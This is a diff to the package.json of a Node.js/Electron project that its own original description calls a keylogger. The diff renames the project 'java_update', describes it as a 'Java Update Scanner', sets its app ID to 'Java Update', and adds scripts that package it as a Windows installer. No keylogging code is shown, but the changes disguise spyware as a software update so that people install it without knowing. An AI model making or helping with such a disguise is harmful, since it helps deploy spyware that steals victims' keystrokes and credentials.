@@ -1,16 +1,28 @@
 {
-  "name": "kl-kl",
+  "name": "java_update",
   "version": "1.0.0",
-  "description": "Keylogger written in Node.js and Electron. ",
+  "description": "Java Update Scanner",
   "main": "main.js",
   "scripts": {
-    "start": "electron ."
+    "start": "electron .",
+    "build": "electron-packager . --icon ./build/icon.ico --out ./dist --overwrite",
+    "setup": "electron-installer-windows --src ./dist/java_update-win32-x64 --dest ./dist/installer --config ./config.json"
+  },
+  "build": {
+    "appId": "Java Update",
+    "mac": {
+      "category": "your.app.category.type"
+    }
   },
   "repository": {
     "type": "git",
     "url": "git+https://github.com/524umc/kl-kl.git"
   },
-  "author": "",
+  "author":  {
+    "name": "My Name",
+    "email": "my@emailaddress.com",
+    "url": "https://www.mywebsite.com"
+  },
   "license": "ISC",
   "bugs": {
     "url": "https://github.com/524umc/kl-kl/issues"
@@ -22,6 +34,8 @@
     "gkm": "^0.2.0"
   },
   "devDependencies": {
-    "electron": "^2.0.8"
+    "electron": "^2.0.8",
+    "electron-installer-windows": "^1.1.0",
+    "electron-packager": "^12.1.1"
   }
 }
